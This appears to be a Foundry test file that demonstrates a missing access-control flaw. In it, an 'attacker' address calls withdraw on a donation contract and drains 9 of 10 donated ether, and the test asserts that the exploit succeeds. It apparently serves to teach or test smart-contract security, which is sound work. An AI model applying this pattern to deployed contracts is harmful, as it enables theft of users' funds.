// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {AccessControl} from "../src/AccessControl.sol";

contract AccessControlTest is Test {
    AccessControl public accessControl;

    address payable public attacker = payable(address(1));
    address public userOne = address(3);
    address public ngo = address(2);

    function setUp() external {
        // Fund userOne with 10 ether
        vm.deal(userOne, 10 ether);

        // Deploy the AccessControl contract as the NGO
        vm.startPrank(ngo);
        accessControl = new AccessControl();
        vm.stopPrank();
    }

    function testExploit() external {
        // Simulate userOne donating 10 ether to the AccessControl contract
        vm.startPrank(userOne);
        accessControl.donate{value: 10 ether}();
        vm.stopPrank();

        // Assert that the contract has 10 ether balance
        require(address(accessControl).balance == 10 ether, "Donation failed");

        // Simulate attacker withdrawing 9 ether from the AccessControl contract
        vm.startPrank(attacker);
        accessControl.withdraw(attacker, 9 ether);
        vm.stopPrank();

        // Assert that the attacker successfully withdrew 9 ether
        require(attacker.balance == 9 ether, "Exploit failed");
    }
}
